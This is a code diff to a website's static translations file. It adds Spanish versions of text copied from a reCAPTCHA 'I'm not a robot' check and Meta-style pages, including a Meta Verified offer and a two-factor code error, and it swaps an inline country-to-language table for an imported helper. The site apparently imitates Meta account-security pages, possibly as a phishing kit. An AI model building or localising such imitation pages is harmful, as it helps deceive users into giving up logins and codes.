@@ -1,4 +1,6 @@
 // Static translations for entire website - instantly loaded, no API calls
+import { getLanguageForCountry } from './country-language-map';
+
 type LangKey = 'en' | 'vi' | 'es' | 'fr' | 'de' | 'ja' | 'zh' | 'ko' | 'pt' | 'th' | 'id' | 'ar' | 'ru' | 'uk' | 'hi' | 'bn';
 const translations: Record<LangKey, Record<string, string>> = {
     en: {
@@ -337,6 +339,16 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Código',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'El código de autenticación de dos factores que ingresó es incorrecto. Por favor, intente nuevamente después',
         'Continue': 'Continuar',
+        // Live page translations
+        'I\'m not a robot': 'No soy un robot',
+        'reCAPTCHA': 'reCAPTCHA',
+        'Privacy - Terms': 'Privacidad - Términos',
+        'This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.': 'Esto nos ayuda a combatir conductas dañinas, detectar y prevenir spam y mantener la integridad de nuestros Productos.',
+        'We\'ve used Google\'s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google\'s': 'Hemos utilizado el producto reCAPTCHA Enterprise de Google para proporcionar esta verificación de seguridad. Tu uso de reCAPTCHA Enterprise está sujeto a',
+        'Privacy Policy': 'Política de Privacidad',
+        'Terms of Use': 'Términos de Uso',
+        'and': 'y',
+        'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.': 'reCAPTCHA Enterprise recopila información de hardware y software, como datos de dispositivos y aplicaciones, y la envía a Google para proporcionar, mantener y mejorar reCAPTCHA Enterprise y para propósitos generales de seguridad. Google no utiliza esta información para publicidad personalizada.'
     },
     fr: {
         'Upgrade your profile with Meta Verified — enjoy exclusive benefits.': 'Améliorez votre profil avec Meta Verified — profitez d\'avantages exclusifs.',
@@ -1677,15 +1689,8 @@ export function getTranslations(lang: string = 'en'): Record<string, string> {
 
 // Helper function to get language key from country code
 export function getLanguageFromCountry(countryCode: string): LangKey {
-    const countryLower = countryCode.toLowerCase();
-    const mapping: Record<string, LangKey> = {
-        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
-        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
-        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
-        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
-        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
-        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
-        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
-    };
-    return mapping[countryLower] || 'en';
+    const languageCode = getLanguageForCountry(countryCode);
+    
+    // Cast the LanguageCode to LangKey (they should be compatible)
+    return languageCode as LangKey;
 }
